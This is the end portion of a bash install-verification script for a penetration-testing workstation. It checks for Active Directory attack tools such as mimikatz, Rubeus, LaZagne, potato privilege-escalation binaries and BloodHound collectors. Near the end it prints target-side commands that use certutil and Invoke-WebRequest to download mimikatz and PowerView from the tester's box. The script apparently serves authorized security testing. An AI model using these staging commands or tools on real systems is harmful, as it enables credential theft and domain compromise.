if [ -f "$USER_HOME/dropzone/Ghostpack-CompiledBinaries/Rubeus.exe" ]; then
    if head -c 2 "$USER_HOME/dropzone/Ghostpack-CompiledBinaries/Rubeus.exe" | grep -qa "^MZ"; then
        print_success "Rubeus.exe verified (valid PE)"; AD_PASS=$((AD_PASS+1))
    else
        print_error "Rubeus.exe is not a PE file - bad clone"; AD_FAIL=$((AD_FAIL+1))
    fi
fi
verify_repo "$USER_HOME/dropzone/SharpEfsPotato" "SharpEfsPotato"
verify_repo "$USER_HOME/dropzone/bloodyAD" "bloodyAD"
# Running PKINITtools with -h imports minikerberos, so this proves the tool AND
# its dependency in one go - the thing a file-existence check cannot tell you.
verify_cmd "PKINITtools" "python3 $USER_HOME/dropzone/PKINITtools/gettgtpkinit.py -h" "usage|error"

# --- the collectors, and they are checked as a PAIR ------------------------
# Both must exist, because the two viewers each need their own. A box with only
# one of them has a graph path that fails at ingest rather than at collection,
# which is the expensive place to find out.
verify_tool "bloodhound-ce-python" "bloodhound-ce-python -h" "usage|bloodhound"

verify_repo "$USER_HOME/dropzone/krbrelayx" "krbrelayx"
verify_cmd  "krbrelayx printerbug" "python3 $USER_HOME/dropzone/krbrelayx/printerbug.py -h" "usage|error"
verify_repo "$USER_HOME/dropzone/gMSADumper" "gMSADumper"
verify_repo "$USER_HOME/dropzone/KeyTabExtract" "KeyTabExtract"
verify_repo "$USER_HOME/dropzone/certighost" "Certighost PoC (CVE-2026-54121)"

# --- Windows payload set ---------------------------------------------------
# Every one of these is fetched over HTTP, so the failure mode that matters is a
# captive portal or intercepting proxy returning an HTML page with a 200 status.
# A PE starts "MZ" and a PowerShell script does not start "<" - that is enough to
# tell a real payload from a login page, and it is the check all.sh's
# check_payload exists for.
verify_pe() {   # <file> <desc>
    local f=$1 desc=$2
    if [ ! -s "$f" ]; then
        print_error "$desc NOT found"; AD_FAIL=$((AD_FAIL+1)); return 0
    fi
    if head -c 2 "$f" | grep -qa "^MZ"; then
        print_success "$desc verified (valid PE)"; AD_PASS=$((AD_PASS+1))
    else
        print_error "$desc is NOT a PE - captive portal or failed download?"
        AD_FAIL=$((AD_FAIL+1))
    fi
    return 0
}
verify_ps1() {  # <file> <desc> - reject HTML masquerading as a script
    local f=$1 desc=$2
    if [ ! -s "$f" ]; then
        print_error "$desc NOT found"; AD_FAIL=$((AD_FAIL+1)); return 0
    fi
    if head -c 512 "$f" | grep -qaiE '<!doctype|<html'; then
        print_error "$desc is HTML, not PowerShell - captive portal?"
        AD_FAIL=$((AD_FAIL+1))
    else
        print_success "$desc verified"; AD_PASS=$((AD_PASS+1))
    fi
    return 0
}

WINDIR="$USER_HOME/dropzone/windows"
verify_pe  "$WINDIR/mimikatz.exe"               "mimikatz.exe"
verify_pe  "$WINDIR/PrintSpoofer64.exe"         "PrintSpoofer64.exe"
verify_pe  "$WINDIR/GodPotato-NET4.exe"         "GodPotato-NET4.exe"
verify_pe  "$WINDIR/LaZagne.exe"                "LaZagne.exe"
verify_pe  "$WINDIR/accesschk64.exe"            "accesschk64.exe"
verify_pe  "$WINDIR/agent.exe"                  "ligolo agent.exe"
verify_ps1 "$WINDIR/PowerView.ps1"              "PowerView.ps1"
verify_ps1 "$WINDIR/Powermad.ps1"               "Powermad.ps1 (RBCD chain)"
verify_ps1 "$WINDIR/Invoke-RunasCs.ps1"         "Invoke-RunasCs.ps1"
verify_ps1 "$WINDIR/adPEAS.ps1"                 "adPEAS.ps1"
verify_file "$WINDIR/pstools/PsExec64.exe"      "PSTools (PsExec64)"
verify_repo "$WINDIR/PowerUpSQL"                "PowerUpSQL"
# The two SharpHound generations must BOTH be present and must NOT be in the same
# directory - that separation is the only thing stopping a mixed ingest.
verify_cmd "SharpHound LEGACY (1.x) present" \
    "ls $WINDIR/legacy/ | grep -qi sharphound && echo found" "found"
verify_cmd "SharpHound CE (2.x) present" \
    "ls $WINDIR/ce/ | grep -qi sharphound && echo found" "found"

verify_tool "ligolo-proxy" "ligolo-proxy --help" "ligolo|usage|selfcert"

verify_pymod pypykatz "pypykatz"
verify_pymod impacket "impacket (python module)"
verify_pymod ldap3 "ldap3 (bloodyAD dependency)"

echo ""
echo -e "${GREEN}═══════════════════════════════════════${NC}"
echo -e "${GREEN}AD Tools Verification Summary${NC}"
echo -e "${GREEN}═══════════════════════════════════════${NC}"
echo -e "${GREEN}Passed:  $AD_PASS${NC}"
echo -e "${RED}Failed:  $AD_FAIL${NC}"
echo ""

if [ $AD_FAIL -eq 0 ]; then
    print_success "All AD tools verified successfully!"
else
    print_warning "$AD_FAIL AD tools failed verification - check log file"
fi

if [ ${#APT_FAILED[@]} -gt 0 ]; then
    echo ""
    print_warning "APT packages that FAILED to install: ${APT_FAILED[*]}"
    print_warning "  Retry manually: sudo apt install ${APT_FAILED[*]}"
fi

pin_summary

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   BloodHound / Neo4j - how to launch                  ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"
print_success "BloodHound CE:  sudo bloodhound-setup   (first time - PRINTS its admin creds)"
print_success "                then  sudo bloodhound-start   (stop: sudo bloodhound-stop)"
print_success "Raw neo4j (legacy tooling):  sudo neo4j start  ->  http://localhost:7474  (neo4j/neo4j, set new pw on 1st login)"
echo ""
print_warning "TWO graph stacks - do not mix collections (ingest fails, it does not warn):"
print_warning "  bloodhound-python      + windows/legacy/SharpHound  ->  BloodHound 4.3.1 (Windows box)"
print_warning "  bloodhound-ce-python   + windows/ce/SharpHound      ->  BloodHound CE (this box)"
print_warning "  azurehound                                          ->  BloodHound CE only"

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   Windows payload set - how to serve it                ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"
print_success "cd ~/dropzone/windows && python3 -m http.server 9999"
print_success "  target>  certutil -urlcache -split -f http://<this-box>:9999/mimikatz.exe m.exe"
print_success "  target>  iwr -UseBasicParsing http://<this-box>:9999/PowerView.ps1 -OutFile pv.ps1"
print_status  "Or over SMB:  impacket-smbserver -smb2support share ~/dropzone/windows"

echo ""
echo -e "${YELLOW}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║   IMPORTANT: LOG OUT AND BACK IN (or reboot) NOW       ║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════╝${NC}"
print_warning "A fresh login activates command logging, the uniform terminal look,"
print_warning "docker group access, and PATH for ~/go/bin and ~/.local/bin (nxc, impacket)."

echo ""
print_success "Good Luck!"
